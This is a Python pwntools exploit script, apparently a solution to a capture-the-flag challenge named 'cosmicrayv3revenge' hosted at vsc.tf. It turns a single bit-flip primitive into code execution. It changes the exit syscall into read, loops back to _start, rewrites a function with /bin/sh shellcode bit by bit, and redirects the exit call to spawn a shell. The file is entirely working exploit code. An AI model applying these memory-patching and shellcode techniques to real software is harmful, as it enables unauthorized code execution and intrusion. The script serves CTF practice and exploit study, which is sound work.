#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntmpl -nc 'nc vsc.tf 7005'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = context.binary = ELF(args.EXE or 'cosmicrayv3revenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'vsc.tf'
port = int(args.PORT or 7005)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *0x4015fa
b *0x4013ff
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

deregister_bytes = [ 0xb8, 0x10, 0x40, 0x40, 0x0, 0x48, 0x3d, 0x10, 0x40, 0x40, 0x0, 0x74, 0x13, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x9, 0xbf, 0x10, 0x40, 0x40, 0x0, 0xff, 0xe0, 0x66, 0x90, 0xc3, 0x66, 0x66, 0x2e, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0x1f, 0x40, 0x0, 0xbe, 0x10, 0x40, 0x40, 0x0, 0x48, 0x81, 0xee, 0x10, 0x40, 0x40, 0x0, 0x48, 0x89, 0xf0, 0x48, 0xc1, 0xee, 0x3f, 0x48, 0xc1, 0xf8, 0x3, 0x48, 0x1, 0xc6, 0x48, 0xd1, 0xfe, 0x74, 0x11, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x7, 0xbf, 0x10, 0x40, 0x40, 0x0, 0xff, 0xe0, 0xc3, 0x66, 0x66, 0x2e ]
deregister_address = 0x4011d0
desired_bytes = asm(shellcraft.sh())

def flip(address, bit):
    io.recvuntil(b"through:\n")

    io.sendline(hex(address).encode())
    io.recvuntil(b"flip:")
    io.sendline(str(bit).encode())


def rop_to_start():
    io.recvuntil(b"Bit successfully flipped!")
    io.send(fit({
        54: 0x401190 # The address of `_start`
    })[:0x3c])


flip(0x4015fa, 6) # Flip a bit in mov eax, 0x3c to make it mov edx, 0x3c. This turns the exit syscall into read syscall

rop_to_start() # Use the read syscall to overwrite the stored RIP

# Overwrite the body of deregister_tm_clones function with /bin/sh shellcode
curr_address = deregister_address
for i in range(len(desired_bytes)):
    shellcode_bits = bin(desired_bytes[i])[2:]
    exit_bits = bin(deregister_bytes[i])[2:]

    #fill 0's at the start

    shellcode_bits = "0" * (8 - len(shellcode_bits)) + shellcode_bits 
    exit_bits = "0" * (8 - len(exit_bits)) + exit_bits

    for i in range(len(exit_bits)):
        if exit_bits[i] != shellcode_bits[i]:
            flip(curr_address, i)
            rop_to_start()
    curr_address += 1

# Overwrite `call exit@plt` into `call deregister_tm_clones`
desired_bytes = [0xe8, 0xa3, 0xfc, 0xff, 0xff]
exit_call_bytes = [0xe8, 0x53, 0xfc, 0xff, 0xff]
exit_call_address = 0x401528
curr_address = exit_call_address
for i in range(len(desired_bytes)):
    shellcode_bits = bin(desired_bytes[i])[2:]
    exit_bits = bin(exit_call_bytes[i])[2:]

    # Fill 0's at the start

    shellcode_bits = "0" * (8 - len(shellcode_bits)) + shellcode_bits 
    exit_bits = "0" * (8 - len(exit_bits)) + exit_bits

    for i in range(len(exit_bits)):
        if exit_bits[i] != shellcode_bits[i]:
            flip(curr_address, i)
            rop_to_start()
    curr_address += 1


flip(0, -1) # Trigger exit and thus the exploit

io.interactive()
